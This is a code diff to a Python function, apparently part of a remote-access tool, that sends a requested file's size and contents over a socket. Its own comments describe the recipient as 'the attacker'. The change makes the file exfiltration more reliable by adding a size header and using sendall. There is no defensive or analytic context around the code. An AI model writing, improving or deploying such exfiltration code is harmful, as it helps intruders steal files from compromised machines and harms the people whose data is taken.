@@ -18,13 +18,22 @@ def send_file(conn):
     print(f"The Filename is: {filename}")
     if os.path.exists(filename):
 
+        conn.send("File exists".encode('utf-8'))
+
+        # Get the size of the file
+        file_size = os.path.getsize(filename)
+        print(f"Sending file: {filename} of size {file_size} bytes")
+
+        # Send the file size to the server
+        conn.sendall(str(file_size).encode('utf-8'))
+
         with open(filename, 'rb') as file:
             #conn.sendall('Start Downloading...').encode('utf-8')  # Notify the attacker that file transfer is starting
             print('Start Download...')
             chunk = file.read(1024)
 
             while chunk:
-                conn.send(chunk)
+                conn.sendall(chunk)
                 chunk = file.read(1024)
             #conn.sendall(b"END_FILE_TRANSFER")  # Notify the attacker that file transfer is complete
             print('File download success!')
